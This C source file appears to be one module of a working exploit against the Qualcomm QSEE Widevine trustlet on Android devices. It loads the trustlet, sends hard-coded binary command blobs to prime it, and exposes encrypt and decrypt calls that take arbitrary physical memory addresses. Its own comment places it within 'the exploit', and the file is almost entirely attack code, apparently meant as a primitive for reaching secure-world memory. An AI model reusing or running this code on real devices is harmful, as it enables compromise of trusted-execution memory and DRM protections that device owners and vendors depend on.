#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>

#include "QSEEComAPI.h"
#include "ion.h"
#include "linux_uapi/msm_ion.h"
#include "widevine.h"

#define APP_NAME "widevine"
#define APP_PATH "/vendor/firmware"
#define ION_SIZE (0x10000)
#define RESP_LEN (0xc)

#define SEND_CMD(cmd, num, expected_result)                                  \
    do {                                                                     \
        if (0 == send_widevine_cmd((void *)(cmd), sizeof(cmd), (num),        \
                                   (expected_result))) {                     \
            return 0;                                                        \
        }                                                                    \
    } while (0);

static struct QSEECom_handle *g_handle = NULL;

static int send_widevine_cmd(void *cmd, uint32_t len, unsigned int cmd_num,
                             uint32_t expected_result)
{
    uint8_t resp[RESP_LEN] = {0};
    if (0 != QSEECom_send_cmd(g_handle, cmd, len, resp, sizeof(resp))) {
        fprintf(stderr, "[-] Failed to send command #%u\n", cmd_num);
        return 0;
    }
    uint32_t cmd_result = *(uint32_t *)(resp + 4);
    if (expected_result != cmd_result) {
        fprintf(stderr,
                "[-] Command #%u returned bad result: 0x%" PRIx32 "\n",
                cmd_num, cmd_result);
        return 0;
    }
    return 1;
}

// Sanity: Check that we can encrypt and decrypt and receive the original data
static int sanity_encrypt_decrypt(void)
{
    int result = 0;
    static const char data[] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b,
        0x0c, 0x0d, 0x0e, 0x0f
    };

    // Prepare an ION mapping with the data
    ion_data_t ion_data = {0};
    if (0 == ion_memalloc(0x1000, ION_QSECOM_HEAP_ID, &ion_data)) {
        fprintf(stderr, "[-] Sanity ION allocation failed\n");
        return 0;
    }
    struct QSEECom_ion_fd_info fd_info = {0};
    memcpy(ion_data.map, data, sizeof(data));

    // Send commands to encrypt and decrypt the same data
    fd_info.data[0].fd = ion_data.fd;
    fd_info.data[0].cmd_buf_offset = WIDEVINE_CMD_IN_OFFSET;
    fd_info.data[1].fd = ion_data.fd;
    fd_info.data[1].cmd_buf_offset = WIDEVINE_CMD_OUT_OFFSET;
    if (0 == widevine_send_encrypt(0, 0, sizeof(data), &fd_info)) {
        fprintf(stderr, "[-] Sanity encrypt failed\n");
        goto cleanup;
    }
    // Make sure data was actually encrypted
    if (0 == memcmp(ion_data.map, data, sizeof(data))) {
        fprintf(stderr,
                "[-] Sanity encrypt didn't actually encrypt anything...\n");
        goto cleanup;
    }
    if (0 == widevine_send_decrypt(0, 0, sizeof(data), &fd_info)) {
        fprintf(stderr, "[-] Sanity decrypt failed\n");
        goto cleanup;
    }
    // Now check that the decrypted data is same as the original
    if (0 != memcmp(ion_data.map, data, sizeof(data))) {
        fprintf(stderr,
                "[-] Sanity decrypt data != encrypt data\n");
        goto cleanup;
    }

    result = 1;

cleanup:
    ion_memfree(&ion_data);
    return result;
}

int widevine_setup(void)
{
    if (0 != QSEECom_start_app(&g_handle, APP_PATH, APP_NAME, ION_SIZE)) {
        fprintf(stderr, "[-] Failed to start widevine app\n");
        return 0;
    }

    // Widevine itself is out of the scope of the exploit, so I'm not going to
    // expand too much about what's going on here
    // The key is that we want widevine to be able to perform encrypt and
    // decrypt operations, as they receive their data from non-secure memory.
    // The set of commands in here are commands we send to widevine, which set
    // it up to be able to perform encrypt and decrypt operations

    static const uint8_t cmd1[] = {
        0x01, 0x10, 0x06, 0x00, 0x0f, 0x00, 0x00, 0x00
    };
    SEND_CMD(cmd1, 1, 0);

    static const uint8_t cmd2[] = { 0x30, 0x10, 0x06, 0x00 };
    SEND_CMD(cmd2, 2, 0);

    static const uint8_t cmd3[] = { 0x2c, 0x10, 0x06, 0x00 };
    SEND_CMD(cmd3, 3, 0);

    static const uint8_t cmd4[] = { 0x03, 0x10, 0x06, 0x00 };
    SEND_CMD(cmd4, 4, 1);

    static uint8_t cmd5[0xa010] = {0};
    static const uint8_t cmd5_part1[] = {
        0x05, 0x10, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x41, 0x55, 0x54, 0x48,
        0x45, 0x4e, 0x54, 0x49, 0x43, 0x41, 0x54, 0x49, 0x4f, 0x4e, 0x00, 0x0a,
        0x4c, 0x08, 0x00, 0x12, 0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x10,
        0x19, 0x07, 0xd9, 0xff, 0xde, 0x13, 0xaa, 0x95, 0xc1, 0x22, 0x67, 0x80,
        0x53, 0x36, 0x21, 0x36, 0xbd, 0xf8, 0x40, 0x8f, 0x82, 0x76, 0xe4, 0xc2,
        0xd8, 0x7e, 0xc5, 0x2b, 0x61, 0xaa, 0x1b, 0x9f, 0x64, 0x6e, 0x58, 0x73,
        0x49, 0x30, 0xac, 0xeb, 0xe8, 0x99, 0xb3, 0xe4, 0x64, 0x18, 0x9a, 0x14,
        0xa8, 0x72, 0x02, 0xfb, 0x02, 0x57, 0x4e, 0x70, 0x64, 0x0b, 0xd2, 0x2e,
        0xf4, 0x4b, 0x2d, 0x7e, 0x39, 0x12, 0x25, 0x0a, 0x23, 0x0a, 0x14, 0x08,
        0x01, 0x12, 0x10, 0x09, 0x15, 0x00, 0x7c, 0xaa, 0x9b, 0x59, 0x31, 0xb7,
        0x6a, 0x3a, 0x85, 0xf0, 0x46, 0x52, 0x3e, 0x10, 0x01, 0x1a, 0x09, 0x39,
        0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x18, 0x01, 0x20, 0x00,
        0x2a, 0x0c, 0x31, 0x38, 0x38, 0x36, 0x37, 0x38, 0x37, 0x34, 0x30, 0x35,
        0x00, 0x00, 0x00, 0x00, 0x02
    };
    static const uint8_t cmd5_part2[] = {
        0x9a, 0x00, 0x00, 0x00, 0x45, 0x4e, 0x43, 0x52, 0x59, 0x50, 0x54, 0x49,
        0x4f, 0x4e, 0x00, 0x0a, 0x4c, 0x08, 0x00, 0x12, 0x48, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x00, 0x10, 0x19, 0x07, 0xd9, 0xff, 0xde, 0x13, 0xaa, 0x95,
        0xc1, 0x22, 0x67, 0x80, 0x53, 0x36, 0x21, 0x36, 0xbd, 0xf8, 0x40, 0x8f,
        0x82, 0x76, 0xe4, 0xc2, 0xd8, 0x7e, 0xc5, 0x2b, 0x61, 0xaa, 0x1b, 0x9f,
        0x64, 0x6e, 0x58, 0x73, 0x49, 0x30, 0xac, 0xeb, 0xe8, 0x99, 0xb3, 0xe4,
        0x64, 0x18, 0x9a, 0x14, 0xa8, 0x72, 0x02, 0xfb, 0x02, 0x57, 0x4e, 0x70,
        0x64, 0x0b, 0xd2, 0x2e, 0xf4, 0x4b, 0x2d, 0x7e, 0x39, 0x12, 0x25, 0x0a,
        0x23, 0x0a, 0x14, 0x08, 0x01, 0x12, 0x10, 0x09, 0x15, 0x00, 0x7c, 0xaa,
        0x9b, 0x59, 0x31, 0xb7, 0x6a, 0x3a, 0x85, 0xf0, 0x46, 0x52, 0x3e, 0x10,
        0x01, 0x1a, 0x09, 0x39, 0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31,
        0x18, 0x01, 0x20, 0x00, 0x2a, 0x0c, 0x31, 0x38, 0x38, 0x36, 0x37, 0x38,
        0x37, 0x34, 0x30, 0x35, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80
    };
    memcpy(cmd5, cmd5_part1, sizeof(cmd5_part1));
    memcpy(cmd5 + 0x5008, cmd5_part2, sizeof(cmd5_part2));
    cmd5[0xa00c] = 0x96;
    SEND_CMD(cmd5, 5, 0);

    static uint8_t cmd6[0xc8e6] = {0};
    static const uint8_t cmd6_part1[] = {
        0x33, 0x10, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x10, 0x00, 0x00, 0x00, 0x41, 0x57, 0x91, 0x49, 0xea, 0xb7, 0xfd, 0xec,
        0xbd, 0x33, 0xc9, 0x74, 0x24, 0xa8, 0x51, 0xc5, 0x04, 0x04, 0x04, 0x04,
        0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
        0x10, 0x00, 0x00, 0x00, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
        0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
        0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
        0xff, 0xa3, 0x92, 0x3f, 0x6b, 0x36, 0x5f, 0x54, 0x42, 0xf1, 0xd9, 0x27,
        0x94, 0xfb, 0x62, 0x61, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04,
        0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0xa0, 0xe0, 0xd2, 0x33,
        0xae, 0xd3, 0xaa, 0x35, 0xd6, 0xa0, 0xdc, 0x4a, 0x5f, 0x50, 0x7e, 0xd6,
        0xaf, 0x7d, 0x78, 0xc4, 0xa2, 0x9b, 0xed, 0x06, 0x85, 0x02, 0x8c, 0x11,
        0x01, 0x81, 0x22, 0x4e, 0x34, 0xa8, 0xff, 0x9c, 0x6a, 0xfb, 0xad, 0xde,
        0xbf, 0x92, 0x78, 0x9b, 0xc2, 0x75, 0x5f, 0xff, 0x50, 0x17, 0xef, 0xff,
        0x47, 0xfe, 0xca, 0x13, 0xa8, 0x3a, 0x37, 0x40, 0xdb, 0xd8, 0x97, 0xd0,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0xbf, 0x60, 0xeb,
        0x0b
    };
    static const uint8_t cmd6_part2[] = {
        0xc8, 0x00, 0x00, 0x00, 0x90, 0xd0, 0x8a, 0x4f, 0x93, 0xc6, 0xfa, 0x0f,
        0x2c, 0x4d, 0xc3, 0x0e, 0xdb, 0xa1, 0x39, 0xb5, 0xb2, 0xc6, 0xca, 0x74,
        0x0a, 0x29, 0x98, 0x33, 0x1a, 0x11, 0xa6, 0x72, 0xf8, 0xbc, 0xd4, 0x2f,
        0x20, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x10, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x40, 0xeb
    };
    memcpy(cmd6, cmd6_part1, sizeof(cmd6_part1));
    memcpy(cmd6 + 0xa008, cmd6_part2, sizeof(cmd6_part2));
    cmd6[0xc8dd] = 0x01;
    SEND_CMD(cmd6, 6, 0);

    if (0 == sanity_encrypt_decrypt()) {
        return 0;
    }

    return 1;
}

// Send either an encrypt or decrypt command
static int send_crypt_cmd(const char *cmd_name, uint32_t cmd_id,
                          physaddr_t in_addr, physaddr_t out_addr,
                          uint32_t len, struct QSEECom_ion_fd_info *fd_info)
{
    if (0 != len % WIDEVINE_LEN_ALIGN) {
        fprintf(stderr, "[-] Bad %s len: 0x%" PRIx32 "\n", cmd_name, len);
        return 0;
    }

    uint8_t cmd[0x200] = {0};
    *(uint32_t *)(cmd + 0x00) = cmd_id;
    *(uint32_t *)(cmd + 0x04) = 1;
    *(uint64_t *)(cmd + 0x08) = in_addr;
    *(uint32_t *)(cmd + 0x10) = len;
    *(uint64_t *)(cmd + 0x28) = out_addr;
    *(uint32_t *)(cmd + 0x50) = 0x10;
    uint8_t resp[RESP_LEN] = {0};

    if (0 != QSEECom_send_modified_cmd_64(g_handle, cmd, sizeof(cmd), resp,
                                          sizeof(resp), fd_info)) {
        perror("[-] Failed to send modified command");
        return 0;
    }
    uint32_t cmd_result = *(uint32_t *)(resp + 4);
    if (0 != cmd_result) {
        fprintf(stderr, "[-] %s returned bad result: 0x%" PRIx32 "\n",
                cmd_name, cmd_result);
        return 0;
    }
    return 1;
}

int widevine_send_encrypt(physaddr_t in_addr, physaddr_t out_addr,
                          uint32_t len, struct QSEECom_ion_fd_info *fd_info)
{
    return send_crypt_cmd("encrypt", 0x61017, in_addr, out_addr, len, fd_info);
}

int widevine_send_decrypt(physaddr_t in_addr, physaddr_t out_addr,
                          uint32_t len, struct QSEECom_ion_fd_info *fd_info)
{
    return send_crypt_cmd("decrypt", 0x61018, in_addr, out_addr, len, fd_info);
}

struct QSEECom_handle *widevine_get_handle(void)
{
    return g_handle;
}
